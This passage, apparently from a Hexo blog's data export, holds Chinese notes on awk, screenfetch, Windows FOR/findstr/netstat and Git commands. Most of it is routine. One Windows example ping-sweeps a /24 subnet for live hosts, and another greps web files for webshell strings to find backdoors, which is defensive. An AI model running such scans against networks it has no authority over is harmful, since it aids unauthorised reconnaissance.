class=\"line\">reboot</span><br></pre></td></tr></table></figure>\n<p><strong>awk + pattern + action</strong>：对读取的每行先使用pattern正则去匹配，满足正则的才进行awk的默认行为，然后进行action。</p>\n<ul>\n<li>格式：<code>awk &#39;/pattern/{action}&#39;</code></li>\n<li>last -n 4 | awk ‘/nick/{print $0}’</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nick     :0           :0               Fri Mar 29 10:08   still logged in</span><br><span class=\"line\">nick     :0           :0               Thu Mar 28 10:48 - 17:16  (06:27)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>last -n 4 | awk ‘/^nick/‘</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reboot   system boot  4.18.0-16-generi Fri Mar 29 10:07   still running</span><br><span class=\"line\">reboot   system boot  4.18.0-16-generi Thu Mar 28 10:47 - 17:16  (06:28)</span><br></pre></td></tr></table></figure>\n<p><code>-F</code> 用于指定分割符，默认是空格。printf()用来格式化输出。</p>\n<ul>\n<li>cat /etc/passwd | awk -F ‘:’ ‘/root/{printf(“%s,%s”,$1,$7)}’</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root,/bin/zsh%</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x01-screenfetch\"><a href=\"#0x01-screenfetch\" class=\"headerlink\" title=\"0x01 screenfetch\"></a>0x01 screenfetch</h3><blockquote>\n<p>用于显示系统基本信息及其banner。</p>\n</blockquote>\n<ul>\n<li>直接<code>screenfetch</code>会显示系统基本信息及其对应的ASCII字符banner。</li>\n<li><code>screenfetch -A &#39;OS_name&#39;</code>：显示系统基本信息及指定系统的ASCII字符banner。</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#用于你可能是ubuntu，但是却希望打印的图标是Mac或其他</span><br><span class=\"line\">screenfetch -A &apos;Mac OS X&apos;</span><br><span class=\"line\">screenfetch -A &apos;Kali Linux&apos;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>screenfetch -s</code>：屏幕快照，即截屏。</li>\n</ul>"},{"title":"Amazing Command -Windows篇","date":"2019-03-22T06:23:54.000Z","_content":"\n### 0x00 前面的话\n\n记录一些自己觉得有用或有趣的DOS命令的用法，持续更新......\n\n直接记录命令的某种用法，具体用法使用命令的`/?`的选项查看。（Window命令的`/？`选项就类似于Linux命令的`-h`）\n\n<!-- more -->\n\n### 0x01 DOS命令\n\n#### **FOR**\n\n> 格式：`FOR %variable IN (set) DO command [command-parameters]`\n>\n> > - `%variable`：指定一个单一字母可替换的参数。\n> > - `(set)`：指定一个或一组文件。可以使用通配符。\n> > - `command`：指定对每个文件执行的命令。\n> > - `command-parameters`：为特定命令指定参数或命令行开关。\n\n**用法一**：从`/R`指定的路径中找到符合set内特征的文件，并打印文件名。\n\n> 格式：`FOR /R [[drive:]path] %variable IN (set) DO command [command-parameters]`\n\n```c\nFOR /R T:\\PythonCode %i IN (*.py) DO @echo %i   //打印出T:\\PythonCode下的所有后缀为.py的文件名。\nFOR /R T:\\PythonCode %i IN (.) DO @echo %i      //遍历T:\\PythonCode下的所有目录，并打印目录路径。\nFOR /R T:\\PythonCode %i IN (*) DO @echo %i      //遍历T:\\PythonCode下的所有目录文件，并打印文件名。\nFOR /R %i IN (.) DO @echo %i                    //遍历当前目录下的目录树。\nFOR /R %i IN (*) DO @echo %i                    //遍历当前目录下的文件名。\n```\n\n**用法二**：使用`/L`参数是，后面的set将变为一个产生数字迭代器。\n\n> 格式：`FOR /L %variable IN (start,step,end) DO command [command-parameters]`\n\n```c\nFOR /L %i IN (1,1,254) DO @ping 192.168.100.%i -n 1 -w 1 | findstr /i ttl  \n\n//ping 192.168.100.0这个网段，并筛选出ping通的主机\n// -n 1表示只发一个echo-request。\n// -w 1表示只等待echo-reply的时间，超时则认为目标不存活。\n```\n\n#### **findstr**\n\n> 将其作为Window下的Grep使用。\n>\n> 常用参数：   \n>\n> - `/I`：大小写不敏感，默认敏感。 \n> - `/M `：如果文件含有匹配项，只打印其文件名，而不是匹配字符所在的行。\n> - `/N`：打印匹配字符所在的行号。\n> - `/S`：在当前目录和所有子目录中搜索匹配文件。\n> - `/F:filename`：从指定的文件中读取文件名列表作为要查找的对象。\n> - `/G:file`：从指定的文件获得搜索字符串。\n\n找到并打印出文件中的字符串行、筛选出字符串行。\n\n```c\nfindstr \"echo header\" fish.php       //找到并打印fish.php文件中，包含'echo'或'header'字符串的行。\nfindstr /C:\"echo header\" fish.php    //找到并打印fish.php文件中，包含'echo header'这个字符串的行。\nfindstr /IMS \"echo header\"  *.php    //在当前目录及所有子目录的所有.php后缀文件中搜索字符串，只打印文件名。\n```\n\n配合`FOR`使用:\n\n```c\nFOR /R %i IN (*) DO @echo %i >> filelist.txt && findstr /IM /F:filelist.txt \"echo\"\n\n// FOR语句会遍历当前目录下的所有文件并保存到filelist.txt\n// findstr会使用'echo'字符串到filelist.txt文件中的所有文件去查找，若文件中有'echo'就打印文件名。\n\nFOR /R D:\\WWW\\ %i IN (*) DO @echo %i >> filelist.txt && findstr /IM /F:filelist.txt /G:strlist.txt\n\n//strlist.txt是包含许多一句话木马字符串的文件，就可以用来简单排查后门。\n```\n\n用于管道符之后进行结果筛选：\n\n```c\nnetstat -ano | findstr /i est   //筛选出所有ESTABLISHED状态的链接。\nnetstat -ano | find \"PID\"       //找到指定进程号的连接。\n```\n\n\n\n\n\n","source":"_posts/Amazing-Command-Windows.md","raw":"---\ntitle: Amazing Command -Windows篇\ndate: 2019-03-22 14:23:54\ntags:\n\t- Winodows\ncategories: Misc\n---\n\n### 0x00 前面的话\n\n记录一些自己觉得有用或有趣的DOS命令的用法，持续更新......\n\n直接记录命令的某种用法，具体用法使用命令的`/?`的选项查看。（Window命令的`/？`选项就类似于Linux命令的`-h`）\n\n<!-- more -->\n\n### 0x01 DOS命令\n\n#### **FOR**\n\n> 格式：`FOR %variable IN (set) DO command [command-parameters]`\n>\n> > - `%variable`：指定一个单一字母可替换的参数。\n> > - `(set)`：指定一个或一组文件。可以使用通配符。\n> > - `command`：指定对每个文件执行的命令。\n> > - `command-parameters`：为特定命令指定参数或命令行开关。\n\n**用法一**：从`/R`指定的路径中找到符合set内特征的文件，并打印文件名。\n\n> 格式：`FOR /R [[drive:]path] %variable IN (set) DO command [command-parameters]`\n\n```c\nFOR /R T:\\PythonCode %i IN (*.py) DO @echo %i   //打印出T:\\PythonCode下的所有后缀为.py的文件名。\nFOR /R T:\\PythonCode %i IN (.) DO @echo %i      //遍历T:\\PythonCode下的所有目录，并打印目录路径。\nFOR /R T:\\PythonCode %i IN (*) DO @echo %i      //遍历T:\\PythonCode下的所有目录文件，并打印文件名。\nFOR /R %i IN (.) DO @echo %i                    //遍历当前目录下的目录树。\nFOR /R %i IN (*) DO @echo %i                    //遍历当前目录下的文件名。\n```\n\n**用法二**：使用`/L`参数是，后面的set将变为一个产生数字迭代器。\n\n> 格式：`FOR /L %variable IN (start,step,end) DO command [command-parameters]`\n\n```c\nFOR /L %i IN (1,1,254) DO @ping 192.168.100.%i -n 1 -w 1 | findstr /i ttl  \n\n//ping 192.168.100.0这个网段，并筛选出ping通的主机\n// -n 1表示只发一个echo-request。\n// -w 1表示只等待echo-reply的时间，超时则认为目标不存活。\n```\n\n#### **findstr**\n\n> 将其作为Window下的Grep使用。\n>\n> 常用参数：   \n>\n> - `/I`：大小写不敏感，默认敏感。 \n> - `/M `：如果文件含有匹配项，只打印其文件名，而不是匹配字符所在的行。\n> - `/N`：打印匹配字符所在的行号。\n> - `/S`：在当前目录和所有子目录中搜索匹配文件。\n> - `/F:filename`：从指定的文件中读取文件名列表作为要查找的对象。\n> - `/G:file`：从指定的文件获得搜索字符串。\n\n找到并打印出文件中的字符串行、筛选出字符串行。\n\n```c\nfindstr \"echo header\" fish.php       //找到并打印fish.php文件中，包含'echo'或'header'字符串的行。\nfindstr /C:\"echo header\" fish.php    //找到并打印fish.php文件中，包含'echo header'这个字符串的行。\nfindstr /IMS \"echo header\"  *.php    //在当前目录及所有子目录的所有.php后缀文件中搜索字符串，只打印文件名。\n```\n\n配合`FOR`使用:\n\n```c\nFOR /R %i IN (*) DO @echo %i >> filelist.txt && findstr /IM /F:filelist.txt \"echo\"\n\n// FOR语句会遍历当前目录下的所有文件并保存到filelist.txt\n// findstr会使用'echo'字符串到filelist.txt文件中的所有文件去查找，若文件中有'echo'就打印文件名。\n\nFOR /R D:\\WWW\\ %i IN (*) DO @echo %i >> filelist.txt && findstr /IM /F:filelist.txt /G:strlist.txt\n\n//strlist.txt是包含许多一句话木马字符串的文件，就可以用来简单排查后门。\n```\n\n用于管道符之后进行结果筛选：\n\n```c\nnetstat -ano | findstr /i est   //筛选出所有ESTABLISHED状态的链接。\nnetstat -ano | find \"PID\"       //找到指定进程号的连接。\n```\n\n\n\n\n\n","slug":"Amazing-Command-Windows","published":1,"updated":"2019-03-25T03:58:48.372Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83kn001w7or0twpc7hsg","content":"<h3 id=\"0x00-前面的话\"><a href=\"#0x00-前面的话\" class=\"headerlink\" title=\"0x00 前面的话\"></a>0x00 前面的话</h3><p>记录一些自己觉得有用或有趣的DOS命令的用法，持续更新……</p>\n<p>直接记录命令的某种用法，具体用法使用命令的<code>/?</code>的选项查看。（Window命令的<code>/？</code>选项就类似于Linux命令的<code>-h</code>）</p>\n<a id=\"more\"></a>\n<h3 id=\"0x01-DOS命令\"><a href=\"#0x01-DOS命令\" class=\"headerlink\" title=\"0x01 DOS命令\"></a>0x01 DOS命令</h3><h4 id=\"FOR\"><a href=\"#FOR\" class=\"headerlink\" title=\"FOR\"></a><strong>FOR</strong></h4><blockquote>\n<p>格式：<code>FOR %variable IN (set) DO command [command-parameters]</code></p>\n<blockquote>\n<ul>\n<li><code>%variable</code>：指定一个单一字母可替换的参数。</li>\n<li><code>(set)</code>：指定一个或一组文件。可以使用通配符。</li>\n<li><code>command</code>：指定对每个文件执行的命令。</li>\n<li><code>command-parameters</code>：为特定命令指定参数或命令行开关。</li>\n</ul>\n</blockquote>\n</blockquote>\n<p><strong>用法一</strong>：从<code>/R</code>指定的路径中找到符合set内特征的文件，并打印文件名。</p>\n<blockquote>\n<p>格式：<code>FOR /R [[drive:]path] %variable IN (set) DO command [command-parameters]</code></p>\n</blockquote>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FOR /R T:\\PythonCode %i IN (*.py) DO @echo %i   //打印出T:\\PythonCode下的所有后缀为.py的文件名。</span><br><span class=\"line\">FOR /R T:\\PythonCode %i IN (.) DO @echo %i      //遍历T:\\PythonCode下的所有目录，并打印目录路径。</span><br><span class=\"line\">FOR /R T:\\PythonCode %i IN (*) DO @echo %i      //遍历T:\\PythonCode下的所有目录文件，并打印文件名。</span><br><span class=\"line\">FOR /R %i IN (.) DO @echo %i                    //遍历当前目录下的目录树。</span><br><span class=\"line\">FOR /R %i IN (*) DO @echo %i                    //遍历当前目录下的文件名。</span><br></pre></td></tr></table></figure>\n<p><strong>用法二</strong>：使用<code>/L</code>参数是，后面的set将变为一个产生数字迭代器。</p>\n<blockquote>\n<p>格式：<code>FOR /L %variable IN (start,step,end) DO command [command-parameters]</code></p>\n</blockquote>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FOR /L %i IN (1,1,254) DO @ping 192.168.100.%i -n 1 -w 1 | findstr /i ttl  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//ping 192.168.100.0这个网段，并筛选出ping通的主机</span></span><br><span class=\"line\"><span class=\"comment\">// -n 1表示只发一个echo-request。</span></span><br><span class=\"line\"><span class=\"comment\">// -w 1表示只等待echo-reply的时间，超时则认为目标不存活。</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"findstr\"><a href=\"#findstr\" class=\"headerlink\" title=\"findstr\"></a><strong>findstr</strong></h4><blockquote>\n<p>将其作为Window下的Grep使用。</p>\n<p>常用参数：   </p>\n<ul>\n<li><code>/I</code>：大小写不敏感，默认敏感。 </li>\n<li><code>/M</code>：如果文件含有匹配项，只打印其文件名，而不是匹配字符所在的行。</li>\n<li><code>/N</code>：打印匹配字符所在的行号。</li>\n<li><code>/S</code>：在当前目录和所有子目录中搜索匹配文件。</li>\n<li><code>/F:filename</code>：从指定的文件中读取文件名列表作为要查找的对象。</li>\n<li><code>/G:file</code>：从指定的文件获得搜索字符串。</li>\n</ul>\n</blockquote>\n<p>找到并打印出文件中的字符串行、筛选出字符串行。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">findstr <span class=\"string\">\"echo header\"</span> fish.php       <span class=\"comment\">//找到并打印fish.php文件中，包含'echo'或'header'字符串的行。</span></span><br><span class=\"line\">findstr /C:<span class=\"string\">\"echo header\"</span> fish.php    <span class=\"comment\">//找到并打印fish.php文件中，包含'echo header'这个字符串的行。</span></span><br><span class=\"line\">findstr /IMS <span class=\"string\">\"echo header\"</span>  *.php    <span class=\"comment\">//在当前目录及所有子目录的所有.php后缀文件中搜索字符串，只打印文件名。</span></span><br></pre></td></tr></table></figure>\n<p>配合<code>FOR</code>使用:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FOR /R %i IN (*) DO @echo %i &gt;&gt; filelist.txt &amp;&amp; findstr /IM /F:filelist.txt \"echo\"</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// FOR语句会遍历当前目录下的所有文件并保存到filelist.txt</span></span><br><span class=\"line\"><span class=\"comment\">// findstr会使用'echo'字符串到filelist.txt文件中的所有文件去查找，若文件中有'echo'就打印文件名。</span></span><br><span class=\"line\"></span><br><span class=\"line\">FOR /R D:\\WWW\\ %i IN (*) DO @echo %i &gt;&gt; filelist.txt &amp;&amp; findstr /IM /F:filelist.txt /G:strlist.txt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//strlist.txt是包含许多一句话木马字符串的文件，就可以用来简单排查后门。</span></span><br></pre></td></tr></table></figure>\n<p>用于管道符之后进行结果筛选：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat -ano | findstr /i est   <span class=\"comment\">//筛选出所有ESTABLISHED状态的链接。</span></span><br><span class=\"line\">netstat -ano | find <span class=\"string\">\"PID\"</span>       <span class=\"comment\">//找到指定进程号的连接。</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h3 id=\"0x00-前面的话\"><a href=\"#0x00-前面的话\" class=\"headerlink\" title=\"0x00 前面的话\"></a>0x00 前面的话</h3><p>记录一些自己觉得有用或有趣的DOS命令的用法，持续更新……</p>\n<p>直接记录命令的某种用法，具体用法使用命令的<code>/?</code>的选项查看。（Window命令的<code>/？</code>选项就类似于Linux命令的<code>-h</code>）</p>","more":"<h3 id=\"0x01-DOS命令\"><a href=\"#0x01-DOS命令\" class=\"headerlink\" title=\"0x01 DOS命令\"></a>0x01 DOS命令</h3><h4 id=\"FOR\"><a href=\"#FOR\" class=\"headerlink\" title=\"FOR\"></a><strong>FOR</strong></h4><blockquote>\n<p>格式：<code>FOR %variable IN (set) DO command [command-parameters]</code></p>\n<blockquote>\n<ul>\n<li><code>%variable</code>：指定一个单一字母可替换的参数。</li>\n<li><code>(set)</code>：指定一个或一组文件。可以使用通配符。</li>\n<li><code>command</code>：指定对每个文件执行的命令。</li>\n<li><code>command-parameters</code>：为特定命令指定参数或命令行开关。</li>\n</ul>\n</blockquote>\n</blockquote>\n<p><strong>用法一</strong>：从<code>/R</code>指定的路径中找到符合set内特征的文件，并打印文件名。</p>\n<blockquote>\n<p>格式：<code>FOR /R [[drive:]path] %variable IN (set) DO command [command-parameters]</code></p>\n</blockquote>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FOR /R T:\\PythonCode %i IN (*.py) DO @echo %i   //打印出T:\\PythonCode下的所有后缀为.py的文件名。</span><br><span class=\"line\">FOR /R T:\\PythonCode %i IN (.) DO @echo %i      //遍历T:\\PythonCode下的所有目录，并打印目录路径。</span><br><span class=\"line\">FOR /R T:\\PythonCode %i IN (*) DO @echo %i      //遍历T:\\PythonCode下的所有目录文件，并打印文件名。</span><br><span class=\"line\">FOR /R %i IN (.) DO @echo %i                    //遍历当前目录下的目录树。</span><br><span class=\"line\">FOR /R %i IN (*) DO @echo %i                    //遍历当前目录下的文件名。</span><br></pre></td></tr></table></figure>\n<p><strong>用法二</strong>：使用<code>/L</code>参数是，后面的set将变为一个产生数字迭代器。</p>\n<blockquote>\n<p>格式：<code>FOR /L %variable IN (start,step,end) DO command [command-parameters]</code></p>\n</blockquote>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FOR /L %i IN (1,1,254) DO @ping 192.168.100.%i -n 1 -w 1 | findstr /i ttl  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//ping 192.168.100.0这个网段，并筛选出ping通的主机</span></span><br><span class=\"line\"><span class=\"comment\">// -n 1表示只发一个echo-request。</span></span><br><span class=\"line\"><span class=\"comment\">// -w 1表示只等待echo-reply的时间，超时则认为目标不存活。</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"findstr\"><a href=\"#findstr\" class=\"headerlink\" title=\"findstr\"></a><strong>findstr</strong></h4><blockquote>\n<p>将其作为Window下的Grep使用。</p>\n<p>常用参数：   </p>\n<ul>\n<li><code>/I</code>：大小写不敏感，默认敏感。 </li>\n<li><code>/M</code>：如果文件含有匹配项，只打印其文件名，而不是匹配字符所在的行。</li>\n<li><code>/N</code>：打印匹配字符所在的行号。</li>\n<li><code>/S</code>：在当前目录和所有子目录中搜索匹配文件。</li>\n<li><code>/F:filename</code>：从指定的文件中读取文件名列表作为要查找的对象。</li>\n<li><code>/G:file</code>：从指定的文件获得搜索字符串。</li>\n</ul>\n</blockquote>\n<p>找到并打印出文件中的字符串行、筛选出字符串行。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">findstr <span class=\"string\">\"echo header\"</span> fish.php       <span class=\"comment\">//找到并打印fish.php文件中，包含'echo'或'header'字符串的行。</span></span><br><span class=\"line\">findstr /C:<span class=\"string\">\"echo header\"</span> fish.php    <span class=\"comment\">//找到并打印fish.php文件中，包含'echo header'这个字符串的行。</span></span><br><span class=\"line\">findstr /IMS <span class=\"string\">\"echo header\"</span>  *.php    <span class=\"comment\">//在当前目录及所有子目录的所有.php后缀文件中搜索字符串，只打印文件名。</span></span><br></pre></td></tr></table></figure>\n<p>配合<code>FOR</code>使用:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FOR /R %i IN (*) DO @echo %i &gt;&gt; filelist.txt &amp;&amp; findstr /IM /F:filelist.txt \"echo\"</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// FOR语句会遍历当前目录下的所有文件并保存到filelist.txt</span></span><br><span class=\"line\"><span class=\"comment\">// findstr会使用'echo'字符串到filelist.txt文件中的所有文件去查找，若文件中有'echo'就打印文件名。</span></span><br><span class=\"line\"></span><br><span class=\"line\">FOR /R D:\\WWW\\ %i IN (*) DO @echo %i &gt;&gt; filelist.txt &amp;&amp; findstr /IM /F:filelist.txt /G:strlist.txt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//strlist.txt是包含许多一句话木马字符串的文件，就可以用来简单排查后门。</span></span><br></pre></td></tr></table></figure>\n<p>用于管道符之后进行结果筛选：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat -ano | findstr /i est   <span class=\"comment\">//筛选出所有ESTABLISHED状态的链接。</span></span><br><span class=\"line\">netstat -ano | find <span class=\"string\">\"PID\"</span>       <span class=\"comment\">//找到指定进程号的连接。</span></span><br></pre></td></tr></table></figure>"},{"title":"Git基本命令及使用","date":"2019-02-22T06:04:26.000Z","_content":"\n## 0x00 Git概述\n\n*Git*是一个开源的分布式版本控制系统,用于敏捷高效地处理任何或小或大的项目。\n\n<!-- more -->\n\n## 0x01 Git安装\n\n到官网下载安装程序安装即可：https://git-scm.com/\n\n## 0x02 基本操作\n\n> **`git   init`  **     #初始化当前目录，表示对当前目录进行版本控制。该步骤是对某一目录进行版本控制的第一步。\n\n> **`git status`**       #查看当前目录文件状态。（红色文件表示未加入版本控制，绿色表示已加入但未提交版本）\n>\n> - PS：对文件进行修改变动后，git会自动发现并变为红色，此时又需要git add变为绿色\n\n> **`git add  <filename> `**    #将指定文件加入版本控制。（加入后git status查看红色变为绿色）\n> **`git add  .  `**          #将当前目录下的所有文件加入版本控制。\n\n> **`git commit -m`** \"详细描述信息\"       #提交一个版本。即生成一次版本快照。版本号是随意生成的MD5值。\n\n> **`git log `**         #版本创建/变更日志。\n> **`git reflog`**     #同上，但更详细。\n>\n> > 可通过这两条命令看到变更的记录，更直白一点就是可以获取版本号用于变更版本。\n\n> **`git reset --hard <版本号>` **    #切换状态到指定的版本（快照）\n\n> **`git branch`  ** #查看分支列表。一个项目可以用众多分支，分支之间拷贝的，即互相独立不影响。默认是master\n>\n> **`git branch <分支名称>`**         #创建一个新分支。（创建的分支是当前所在分支的拷贝，本质是两份独立的拷贝）\n> **`git branch -d <分支名称>`**     #删除指定分支\n>\n> **`git checkout <分支名称>`**     #进入指定分支\n>\n> **`git merge <分支名称>`**          #将指定分支与当前所在分支进行合并。\n\n## 0x03 连接Github\n\n> **`git remote add  <github仓库地址别名>    <github仓库地址>`**        \n>\n> > 别名是为了避免记网址，对应关系会被记录在.git目录的config文件中。\n>\n>\n>\n> **`git clone  <github项目网址>`**      #克隆下载项目\n>\n> **`git pull <github网址别名>  <分支名称>`**    #从github拉取指定分支代码。\n>\n> > 上面条等价于下面两条：\n> > ​\t\t**`git fetch   <github网址别名>    <分支名称> `**\n> > ​\t\t**`git merge   <github网址别名>   <分支名称>`**\n>\n> **`git push <github网址别名>   <分支名称>`**  #将当前所在分支推到github上。\n\n## 0x04 将某些文件隔离出版本控制\n\n- 在工作目录下创建**.gitignore**文件\n- 文件的编写格式内容\n\n```\n*.sql    #表示所有后缀为.sql的文件都被隔离\n*.pyc\t #表示所有后缀为.pyc的文件都被隔离\na.txt\t #表示隔离a.txt\n```\n\n#### 教程博客与参考链接\n\n- https://www.cnblogs.com/wupeiqi/p/7295372.html\n- http://www.ruanyifeng.com/blog/2018/10/git-internals.html\n- http://www.ruanyifeng.com/blog/2015/12/git-workflow.html\n- http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html","source":"_posts/GitNote.md","raw":"---\ntitle: Git基本命令及使用\ndate: 2019-02-22 14:04:26\ntags: 必会技能\ncategories: Misc\n---\n\n## 0x00 Git概述\n\n*Git*是一个开源的分布式版本控制系统,用于敏捷高效地处理任何或小或大的项目。\n\n<!-- more -->\n\n## 0x01 Git安装\n\n到官网下载安装程序安装即可：https://git-scm.com/\n\n## 0x02 基本操作\n\n> **`git   init`  **     #初始化当前目录，表示对当前目录进行版本控制。该步骤是对某一目录进行版本控制的第一步。\n\n> **`git status`**       #查看当前目录文件状态。（红色文件表示未加入版本控制，绿色表示已加入但未提交版本）\n>\n> - PS：对文件进行修改变动后，git会自动发现并变为红色，此时又需要git add变为绿色\n\n> **`git add  <filename> `**    #将指定文件加入版本控制。（加入后git status查看红色变为绿色）\n> **`git add  .  `**          #将当前目录下的所有文件加入版本控制。\n\n> **`git commit -m`** \"详细描述信息\"       #提交一个版本。即生成一次版本快照。版本号是随意生成的MD5值。\n\n> **`git log `**         #版本创建/变更日志。\n> **`git reflog`**     #同上，但更详细。\n>\n> > 可通过这两条命令看到变更的记录，更直白一点就是可以获取版本号用于变更版本。\n\n> **`git reset --hard <版本号>` **    #切换状态到指定的版本（快照）\n\n> **`git branch`  ** #查看分支列表。一个项目可以用众多分支，分支之间拷贝的，即互相独立不影响。默认是master\n>\n> **`git branch <分支名称>`**         #创建一个新分支。（创建的分支是当前所在分支的拷贝，本质是两份独立的拷贝）\n> **`git branch -d <分支名称>`**     #删除指定分支\n>\n> **`git checkout <分支名称>`**     #进入指定分支\n>\n> **`git merge <分支名称>`**          #将指定分支与当前所在分支进行合并。\n\n## 0x03 连接Github\n\n> **`git remote add  <github仓库地址别名>    <github仓库地址>`**        \n>\n> > 别名是为了避免记网址，对应关系会被记录在.git目录的config文件中。\n>\n>\n>\n> **`git clone  <github项目网址>`**      #克隆下载项目\n>\n> **`git pull <github网址别名>  <分支名称>`**    #从github拉取指定分支代码。\n>\n> > 上面条等价于下面两条：\n> > ​\t\t**`git fetch   <github网址别名>    <分支名称> `**\n> > ​\t\t**`git merge   <github网址别名>   <分支名称>`**\n>\n> **`git push <github网址别名>   <分支名称>`**  #将当前所在分支推到github上。\n\n## 0x04 将某些文件隔离出版本控制\n\n- 在工作目录下创建**.gitignore**文件\n- 文件的编写格式内容\n\n```\n*.sql    #表示所有后缀为.sql的文件都被隔离\n*.pyc\t #表示所有后缀为.pyc的文件都被隔离\na.txt\t #表示隔离a.txt\n```\n\n#### 教程博客与参考链接\n\n- https://www.cnblogs.com/wupeiqi/p/7295372.html\n- http://www.ruanyifeng.com/blog/2018/10/git-internals.html\n- http://www.ruanyifeng.com/blog/2015/12/git-workflow.html\n- http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html","slug":"GitNote","published":1,"updated":"2019-02-25T01:33:39.930Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83kq00207or0rwec572t","content":"<h2 id=\"0x00-Git概述\"><a href=\"#0x00-Git概述\" class=\"headerlink\" title=\"0x00 Git概述\"></a>0x00 Git概述</h2><p><em>Git</em>是一个开源的分布式版本控制系统,用于敏捷高效地处理任何或小或大的项目。</p>\n<a id=\"more\"></a>\n<h2 id=\"0x01-Git安装\"><a href=\"#0x01-Git安装\" class=\"headerlink\" title=\"0x01 Git安装\"></a>0x01 Git安装</h2><p>到官网下载安装程序安装即可：<a href=\"https://git-scm.com/\" target=\"_blank\" rel=\"noopener\">https://git-scm.com/</a></p>\n<h2 id=\"0x02-基本操作\"><a href=\"#0x02-基本操作\" class=\"headerlink\" title=\"0x02 基本操作\"></a>0x02 基本操作</h2><blockquote>\n<p><strong><code>git   init</code>  </strong>     #初始化当前目录，表示对当前目录进行版本控制。该步骤是对某一目录进行版本控制的第一步。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>git status</code></strong>       #查看当前目录文件状态。（红色文件表示未加入版本控制，绿色表示已加入但未提交版本）</p>\n<ul>\n<li>PS：对文件进行修改变动后，git会自动发现并变为红色，此时又需要git add变为绿色</li>\n</ul>\n</blockquote>\n<blockquote>\n<p><strong><code>git add  &lt;filename&gt;</code></strong>    #将指定文件加入版本控制。（加入后git status查看红色变为绿色）<br><strong><code>git add  .</code></strong>          #将当前目录下的所有文件加入版本控制。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>git commit -m</code></strong> “详细描述信息”       #提交一个版本。即生成一次版本快照。版本号是随意生成的MD5值。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>git log</code></strong>         #版本创建/变更日志。<br><strong><code>git reflog</code></strong>     #同上，但更详细。</p>\n<blockquote>\n<p>可通过这两条命令看到变更的记录，更直白一点就是可以获取版本号用于变更版本。</p>\n</blockquote>\n</blockquote>\n<blockquote>\n<p><strong><code>git reset --hard &lt;版本号&gt;</code> </strong>    #切换状态到指定的版本（快照）</p>\n</blockquote>\n<blockquote>\n<p><strong><code>git branch</code>  </strong> 